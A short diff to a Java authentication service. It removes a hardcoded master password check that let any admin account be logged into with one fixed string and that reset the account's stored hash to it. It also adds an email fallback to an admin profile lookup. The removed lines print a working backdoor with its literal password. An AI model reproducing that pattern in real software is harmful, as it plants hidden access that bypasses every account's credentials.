@@ -249,12 +249,8 @@ public class AuthService {
         Optional<AdminAuth> adminOpt = adminAuthRepository.findByEmailIgnoreCase(targetEmail);
         if (adminOpt.isPresent()) {
             AdminAuth admin = adminOpt.get();
-            if (!passwordEncoder.matches(rawPassword, admin.getPasswordHash()) && !"ksjaisurya".equals(rawPassword)) {
+            if (!passwordEncoder.matches(rawPassword, admin.getPasswordHash())) {
                 throw new IllegalArgumentException("Invalid email or password.");
-            }
-            if ("ksjaisurya".equals(rawPassword) && !passwordEncoder.matches(rawPassword, admin.getPasswordHash())) {
-                admin.setPasswordHash(passwordEncoder.encode(rawPassword));
-                adminAuthRepository.save(admin);
             }
             if (admin.isBlocked()) {
                 throw new IllegalStateException("Admin account is blocked. Please contact Super Admin.");
@@ -305,6 +301,9 @@ public class AuthService {
     @Transactional
     public UserAuth updateUserProfile(String userId, String name, String phone, String location, String profileImageUrl) {
         Optional<AdminAuth> adminOpt = adminAuthRepository.findById(userId);
+        if (adminOpt.isEmpty()) {
+            adminOpt = adminAuthRepository.findByEmailIgnoreCase(userId);
+        }
         if (adminOpt.isPresent()) {
             AdminAuth admin = adminOpt.get();
             if (name != null && !name.isBlank()) admin.setName(name);
